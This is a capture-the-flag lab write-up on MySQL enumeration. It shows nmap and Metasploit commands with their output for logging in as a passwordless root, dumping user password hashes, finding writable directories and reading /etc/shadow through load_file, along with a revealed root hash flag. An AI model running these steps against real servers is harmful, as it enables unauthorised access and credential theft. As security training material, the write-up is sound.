# MYSQL Enum

**`MYSQL`** - an open-source relational database management system, used to add, access and process data stored in a server database using the **`SQL`** (**S**tructured **Q**uery **L**anguage) syntax. It's also included in the `LAMP` technology stack (Linux, Apache, MySQL, PHP) to store and retrieve data in well-known applications, websites and services.

Default `MYSQL` port is **`3306`**.

```bash
sudo nmap -p3306 -sV -O <TARGET_IP>
```

## Lab 1

>  🔬 [MySQL Recon: Basics](https://attackdefense.pentesteracademy.com/challengedetails?cid=529)
>
>  - Target IP: `192.49.51.3`
>  - `MySQL` server reconnaisance.

```bash
ip -br -c a
	eth1@if176632   UP   192.49.51.2/24 
nmap 192.49.51.3
```

```bash
nmap -sS sV 192.49.51.3
	3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1
```

> 📌 MySQL server version is `5.5.62`

### [mysql](https://dev.mysql.com/doc/refman/8.0/en/mysql.html)

> **`mysql`** - SQL shell with input line editing capabilities.

```bash
mysql -h 192.49.51.3 -u root
```

```bash
MySQL [(none)]> help
# Get a list of MySQL commands

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| books              |
| data               |
| mysql              |
| password           |
| performance_schema |
| secret             |
| store              |
| upload             |
| vendors            |
| videos             |
+--------------------+
11 rows in set (0.001 sec)
```

> 📌 There are `11 databases` on the server.

```bash
MySQL [(none)]> use books;
MySQL [books]> select count(*) from authors;
+----------+
| count(*) |
+----------+
|       10 |
+----------+
1 row in set (0.000 sec)
```

> 📌 There are `10 records` in table *`authors`* inside the books *database*.

![mysql](.gitbook/assets/image-20230219154533850.png)

### Metasploit Enum

- Use the [`mysql_schemadump`](https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_schemadump/) metasploit module to dump the schema of all databases.

```bash
msfconsole
```

```bash
use auxiliary/scanner/mysql/mysql_schemadump 
set RHOSTS 192.49.51.3
set USERNAME root
set PASSWORD ""
exploit
```

```bash
[+] 192.49.51.3:3306      - Schema stored in: /root/.msf4/loot/20230219145005_default_192.49.51.3_mysql_schema_310503.txt
[+] 192.49.51.3:3306      - MySQL Server Schema 
 Host: 192.49.51.3 
 Port: 3306 
 ====================
---
- DBName: books
  Tables:
  - TableName: authors
    Columns:
    - ColumnName: id
      ColumnType: int(11)
    - ColumnName: first_name
      ColumnType: varchar(50)
    - ColumnName: last_name
      ColumnType: varchar(50)
    - ColumnName: email
      ColumnType: varchar(100)
    - ColumnName: birthdate
      ColumnType: date
    - ColumnName: added
      ColumnType: timestamp
- DBName: data
  Tables: []
- DBName: password
  Tables: []
- DBName: secret
  Tables: []
- DBName: store
  Tables: []
- DBName: upload
  Tables: []
- DBName: vendors
  Tables: []
- DBName: videos
  Tables: []
```

![Metasploit - mysql_schemadump](.gitbook/assets/image-20230219160107927.png)

- Use the [`mysql_writable_dirs`](https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_writable_dirs/) metasploit module to enumerate writable directories.

```bash
msfconsole
```

```bash
use auxiliary/scanner/mysql/mysql_writable_dirs
set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
set RHOSTS 192.49.51.3
set VERBOSE false
set PASSWORD ""
exploit
```

```bash
!] 192.49.51.3:3306      - For every writable directory found, a file called UlxAUnoc with the text test will be written to the directory.
[*] 192.49.51.3:3306      - Login...
[*] 192.49.51.3:3306      - Checking /tmp...
[+] 192.49.51.3:3306      - /tmp is writeable
[*] 192.49.51.3:3306      - Checking /etc/passwd...
[!] 192.49.51.3:3306      - Can't create/write to file '/etc/passwd/UlxAUnoc' (Errcode: 20)
[*] 192.49.51.3:3306      - Checking /etc/shadow...
[!] 192.49.51.3:3306      - Can't create/write to file '/etc/shadow/UlxAUnoc' (Errcode: 20)
[*] 192.49.51.3:3306      - Checking /root...
[+] 192.49.51.3:3306      - /root is writeable
[*] 192.49.51.3:3306      - Checking /home...
[!] 192.49.51.3:3306      - Can't create/write to file '/home/UlxAUnoc' (Errcode: 13)
[*] 192.49.51.3:3306      - Checking /etc...
[!] 192.49.51.3:3306      - Can't create/write to file '/etc/UlxAUnoc' (Errcode: 13)
[*] 192.49.51.3:3306      - Checking /etc/hosts...
[!] 192.49.51.3:3306      - Can't create/write to file '/etc/hosts/UlxAUnoc' (Errcode: 20)
[*] 192.49.51.3:3306      - Checking /usr/share...
[!] 192.49.51.3:3306      - Can't create/write to file '/usr/share/UlxAUnoc' (Errcode: 13)
[*] 192.49.51.3:3306      - Checking /etc/config...
[!] 192.49.51.3:3306      - Can't create/write to file '/etc/config/UlxAUnoc' (Errcode: 2)
[*] 192.49.51.3:3306      - Checking /data...
[!] 192.49.51.3:3306      - Can't create/write to file '/data/UlxAUnoc' (Errcode: 2)
[*] 192.49.51.3:3306      - Checking /webdav...
[!] 192.49.51.3:3306      - Can't create/write to file '/webdav/UlxAUnoc' (Errcode: 2)
[*] 192.49.51.3:3306      - Checking /doc...
[!] 192.49.51.3:3306      - Can't create/write to file '/doc/UlxAUnoc' (Errcode: 2)
[*] 192.49.51.3:3306      - Checking /icons...
[!] 192.49.51.3:3306      - Can't create/write to file '/icons/UlxAUnoc' (Errcode: 2)
[*] 192.49.51.3:3306      - Checking /manual...
[!] 192.49.51.3:3306      - Can't create/write to file '/manual/UlxAUnoc' (Errcode: 2)
[*] 192.49.51.3:3306      - Checking /pro...
[!] 192.49.51.3:3306      - Can't create/write to file '/pro/UlxAUnoc' (Errcode: 2)
[*] 192.49.51.3:3306      - Checking /secure...
[!] 192.49.51.3:3306      - Can't create/write to file '/secure/UlxAUnoc' (Errcode: 2)
[*] 192.49.51.3:3306      - Checking /poc...
[!] 192.49.51.3:3306      - Can't create/write to file '/poc/UlxAUnoc' (Errcode: 2)
[*] 192.49.51.3:3306      - Checking /pro...
[!] 192.49.51.3:3306      - Can't create/write to file '/pro/UlxAUnoc' (Errcode: 2)
[*] 192.49.51.3:3306      - Checking /dir...
[!] 192.49.51.3:3306      - Can't create/write to file '/dir/UlxAUnoc' (Errcode: 2)
[*] 192.49.51.3:3306      - Checking /Benefits...
[!] 192.49.51.3:3306      - Can't create/write to file '/Benefits/UlxAUnoc' (Errcode: 2)
[*] 192.49.51.3:3306      - Checking /Data...
[!] 192.49.51.3:3306      - Can't create/write to file '/Data/UlxAUnoc' (Errcode: 2)
[*] 192.49.51.3:3306      - Checking /Invitation...
[!] 192.49.51.3:3306      - Can't create/write to file '/Invitation/UlxAUnoc' (Errcode: 2)
[*] 192.49.51.3:3306      - Checking /Office...
[!] 192.49.51.3:3306      - Can't create/write to file '/Office/UlxAUnoc' (Errcode: 2)
[*] 192.49.51.3:3306      - Checking /Site...
[!] 192.49.51.3:3306      - Can't create/write to file '/Site/UlxAUnoc' (Errcode: 2)
[*] 192.49.51.3:3306      - Checking /Admin...
[!] 192.49.51.3:3306      - Can't create/write to file '/Admin/UlxAUnoc' (Errcode: 2)
[*] 192.49.51.3:3306      - Checking /etc...
[!] 192.49.51.3:3306      - Can't create/write to file '/etc/UlxAUnoc' (Errcode: 13)
```

![Metasploit - mysql_writable_dirs](.gitbook/assets/image-20230219160242823.png)

> 📌 `2` directories are writable: `/tmp` and `/root`

- Use the [`mysql_file_enum`](https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_file_enum/) metasploit module to enumerate readable files.

```bash
msfconsole
```

```bash
use auxiliary/scanner/mysql/mysql_file_enum
set RHOSTS 192.49.51.3
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
set PASSWORD ""
exploit
```

```bash
[+] 192.49.51.3:3306      - /etc/passwd
[+] 192.49.51.3:3306      - /etc/shadow
[+] 192.49.51.3:3306      - /etc/group
[+] 192.49.51.3:3306      - /etc/mysql/my.cn
[+] 192.49.51.3:3306      - /etc/hosts
[+] 192.49.51.3:3306      - /etc/hosts.allow
[+] 192.49.51.3:3306      - /etc/hosts.deny
[+] 192.49.51.3:3306      - /etc/issue
[+] 192.49.51.3:3306      - /etc/fstab
[+] 192.49.51.3:3306      - /proc/version
```

![Metasploit - mysql_file_enum](.gitbook/assets/image-20230219161029085.png)

> 📌 `10` sensitive file are readable: `/etc/passwd`, `/etc/shadow`, `/etc/group`, `/etc/mysql/my.cn`, `/etc/hosts`, `/etc/hosts.allow`, `/etc/hosts.deny`, `/etc/issue`, `/etc/fstab`, `/proc/version`

- Use the [`mysql_hashdump`](https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_hashdump/) metasploit module to list database users and their password hashes.

```bash
msfconsole
```

```bash
use auxiliary/scanner/mysql/mysql_hashdump 
set RHOSTS 192.49.51.3
set USERNAME root
set PASSWORD ""
exploit
```

```bash
[+] 192.49.51.3:3306      - Saving HashString as Loot: root:
[+] 192.49.51.3:3306      - Saving HashString as Loot: root:
[+] 192.49.51.3:3306      - Saving HashString as Loot: root:
[+] 192.49.51.3:3306      - Saving HashString as Loot: root:
[+] 192.49.51.3:3306      - Saving HashString as Loot: debian-sys-maint:*CDDA79A15EF590ED57BB5933ECD27364809EE90D
[+] 192.49.51.3:3306      - Saving HashString as Loot: root:
[+] 192.49.51.3:3306      - Saving HashString as Loot: filetest:*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
[+] 192.49.51.3:3306      - Saving HashString as Loot: ultra:*827EC562775DC9CE458689D36687DCED320F34B0
[+] 192.49.51.3:3306      - Saving HashString as Loot: guest:*17FD2DDCC01E0E66405FB1BA16F033188D18F646
[+] 192.49.51.3:3306      - Saving HashString as Loot: sigver:*027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0
[+] 192.49.51.3:3306      - Saving HashString as Loot: udadmin:*E6DEAD2645D88071D28F004A209691AC60A72AC9
[+] 192.49.51.3:3306      - Saving HashString as Loot: sysadmin:*46CFC7938B60837F46B610A2D10C248874555C14
```

![Metasploit mysql_hashdump](.gitbook/assets/image-20230219162313519.png)

> 📌 `8` db users are present:
>
>  `debian-sys-maint:*CDDA79A15EF590ED57BB5933ECD27364809EE90D`
> `root:`
> `filetest:*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B`
> `ultra:*827EC562775DC9CE458689D36687DCED320F34B0`
> `guest:*17FD2DDCC01E0E66405FB1BA16F033188D18F646`
> `sigver:*027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0`
> `udadmin:*E6DEAD2645D88071D28F004A209691AC60A72AC9`
> `sysadmin:*46CFC7938B60837F46B610A2D10C248874555C14`

```bash
mysql -h 192.49.51.3 -u root
```

```mysql
MySQL [(none)]> select load_file("/etc/shadow");
# /etc/shadow is readable
```

![select load_file("/etc/shadow");](.gitbook/assets/image-20230219162415428.png)

<details>
<summary>Reveal Flag - System password hash for user “root” is: 🚩</summary>



`S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWHRBHRntsKhgqnClY2.KC.vA/`

</details>

### Nmap Enum

- Use [nmap mysql-empty-password script](https://nmap.org/nsedoc/scripts/mysql-empty-password.html) to check MySQL with an empty password for **`root`** and ***anonymous*** users.

```bash
nmap --script=mysql-empty-password -p3306 192.49.51.3
```

```bash
3306/tcp open  mysql
| mysql-empty-password:
|_  root account has empty password
```

![nmap mysql-empty-password](.gitbook/assets/image-20230219163240301.png)

> 📌 *root* and *anonymous* users login is permitted without password.

- Use [nmap `mysql-info` script](https://nmap.org/nsedoc/scripts/mysql-info.html) to check MySQL server information.

```bash
nmap -sV -sC -p3306 192.49.51.3
# mysql-info already in the default scripts
nmap --script=mysql-info -p3306 192.49.51.3
```

```bash
3306/tcp open  mysql
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.62-0ubuntu0.14.04.1
|   Thread ID: 57
|   Capabilities flags: 63487
|   Some Capabilities: Support41Auth, ConnectWithDatabase, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, SupportsCompression, IgnoreSigpipes, LongColumnFlag, FoundRows, InteractiveClient, ODBCClient, SupportsTransactions, Speaks41ProtocolNew, LongPassword, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: u+r!I,>5/-0I_%5y&M2P
|_  Auth Plugin Name: 96
```

![nmap mysql-info](.gitbook/assets/image-20230219163551408.png)

> 📌 `InteractiveClient` is supported on the server.

- Use [nmap ``mysql-users`` script](https://nmap.org/nsedoc/scripts/mysql-users.html) to list all MySQL db users

```bash
nmap --script=mysql-users --script-args="mysqluser='root',mysqlpass=''" -p3306 192.49.51.3
```

```bash
3306/tcp open  mysql
| mysql-users: 
|   filetest
|   root
|   debian-sys-maint
|   guest
|   sigver
|   sysadmin
|   udadmin
|_  ultra
```

![nmap mysql-users](.gitbook/assets/image-20230219165729566.png)

> 📌 DB users are: `filetest`, `root`, `debian-sys-maint`, `guest`, `sigver`, `sysadmin`, `udadmin`, `ultra`

- Use [nmap ``mysql-databases`` script](https://nmap.org/nsedoc/scripts/mysql-databases.html) to list all MySQL db users

```bash
nmap --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''" -p3306 192.49.51.3
```

```bash
3306/tcp open  mysql
| mysql-databases: 
|   information_schema
|   books
|   data
|   mysql
|   password
|   performance_schema
|   secret
|   store
|   upload
|   vendors
|_  videos
```

![nmap mysql-databases](.gitbook/assets/image-20230219170108141.png)

> 📌 MySQL databases are `information_schema`, `books`, `data`, `mysql`, `password`, `performance_schema`, `secret`, `store`, `upload`, `vendors`, `videos`

- Use [nmap ``mysql-variables`` script](https://nmap.org/nsedoc/scripts/mysql-variables.html) to show MySQL variables.

```bash
nmap --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''" -p3306 192.49.51.3
```

![nmap mysql-variables](.gitbook/assets/image-20230219170632432.png)

> 📌 The data directory used by MySQL server is *datadir:* `var/lib/mysql/`

- Use [nmap ``mysql-audit`` script](https://nmap.org/nsedoc/scripts/mysql-audit.html) to audit MySQL server security configuration.

```bash
nmap --script=mysql-audit --script-args="mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename=''" -p3306 192.49.51.3
```

```bash
3306/tcp open  mysql
| mysql-audit: 
|   CIS MySQL Benchmarks v1.0.2
|       3.1: Skip symbolic links => FAIL
|       3.2: Logs not on system partition => PASS
|       3.2: Logs not on database partition => PASS
|       4.1: Supported version of MySQL => REVIEW
|         Version: 5.5.62-0ubuntu0.14.04.1
|       4.4: Remove test database => PASS
|       4.5: Change admin account name => PASS
|       4.7: Verify Secure Password Hashes => PASS
|       4.9: Wildcards in user hostname => PASS
|         The following users were found with wildcards in hostname
|           filetest
|           root
|       4.10: No blank passwords => PASS
|         The following users were found having blank/empty passwords
|           root
|       4.11: Anonymous account => PASS
|       5.1: Access to mysql database => REVIEW
|         Verify the following users that have access to the MySQL database
|           user  host
|       5.2: Do not grant FILE privileges to non Admin users => PASS
|         The following users were found having the FILE privilege
|           filetest
|       5.3: Do not grant PROCESS privileges to non Admin users => PASS
|       5.4: Do not grant SUPER privileges to non Admin users => PASS
|       5.5: Do not grant SHUTDOWN privileges to non Admin users => PASS
|       5.6: Do not grant CREATE USER privileges to non Admin users => PASS
|       5.7: Do not grant RELOAD privileges to non Admin users => PASS
|       5.8: Do not grant GRANT privileges to non Admin users => PASS
|       6.2: Disable Load data local => FAIL
|       6.3: Disable old password hashing => FAIL
|       6.4: Safe show database => FAIL
|       6.5: Secure auth => FAIL
|       6.6: Grant tables => FAIL
|       6.7: Skip merge => FAIL
|       6.8: Skip networking => FAIL
|       6.9: Safe user create => FAIL
|       6.10: Skip symbolic links => FAIL
|     
|     Additional information
|       The audit was performed using the db-account: root
|_      The following admin accounts were excluded from the audit: root,debian-sys-maint
```

![nmap mysql-audit](.gitbook/assets/image-20230219171351543.png)

> 📌 `No File privileges can be granted` to non admin users.

- Use [nmap ``mysql-dump-hashes`` script](https://nmap.org/nsedoc/scripts/mysql-dump-hashes.html) to dump the password hashes.

```bash
nmap --script=mysql-dump-hashes --script-args="username='root',password=''" -p3306 192.49.51.3
```

```bash
3306/tcp open  mysql
| mysql-dump-hashes: 
|   debian-sys-maint:*CDDA79A15EF590ED57BB5933ECD27364809EE90D
|   filetest:*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
|   ultra:*827EC562775DC9CE458689D36687DCED320F34B0
|   guest:*17FD2DDCC01E0E66405FB1BA16F033188D18F646
|   sigver:*027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0
|   udadmin:*E6DEAD2645D88071D28F004A209691AC60A72AC9
|_  sysadmin:*46CFC7938B60837F46B610A2D10C248874555C14
```

![nmap mysql-dump-hashes](.gitbook/assets/image-20230219171617727.png)

> 📌 Users hashes are:
>
> `debian-sys-maint:*CDDA79A15EF590ED57BB5933ECD27364809EE90D`
> `filetest:*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B`
> `ultra:*827EC562775DC9CE458689D36687DCED320F34B0`
> `guest:*17FD2DDCC01E0E66405FB1BA16F033188D18F646`
> `sigver:*027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0`
> `udadmin:*E6DEAD2645D88071D28F004A209691AC60A72AC9`
> `sysadmin:*46CFC7938B60837F46B610A2D10C248874555C14`

- Use [nmap ``mysql-query`` script](https://nmap.org/nsedoc/scripts/mysql-query.html) to run a query against a MySQL db.

```bash
nmap --script=mysql-query --script-args="query='select count(*) from books.authors;',username='root',password=''" -p3306 192.49.51.3
```

```bash
3306/tcp open  mysql
| mysql-query: 
|   count(*)
|   10
|   
|   Query: select count(*) from books.authors;
|_  User: root
```

![nmap mysql-query](.gitbook/assets/image-20230219171909867.png)

------

## Lab 2

>  🔬 [MySQL Recon: Dictionary Attack](https://attackdefense.pentesteracademy.com/challengedetails?cid=532)
>
>  - Target IP: `10.4.16.17`
>  - `MySQL` server reconnaisance.

```bash
nmap 
```

```bash
nmap -sV -O 
```

> 📌 



<details>
<summary>Reveal Flag: 🚩</summary>



``

</details>









<!---

## Lab 3

>  🔬 [Recon: MSSQL: Nmap Scripts](https://attackdefense.pentesteracademy.com/challengedetails?cid=2313)
>
>  - Target IP: `10.4.16.17`
>  - `MySQL` server reconnaisance.

```bash
nmap 
```

```bash
nmap -sV -O 
```













## Lab 4

>  🔬 [Recon: MSSQL: Metasploit](https://attackdefense.pentesteracademy.com/challengedetails?cid=2314)
>
>  - Target IP: `10.4.16.17`
>  - `MySQL` server reconnaisance.

```bash
nmap 
```

```bash
nmap -sV -O 
```


-->



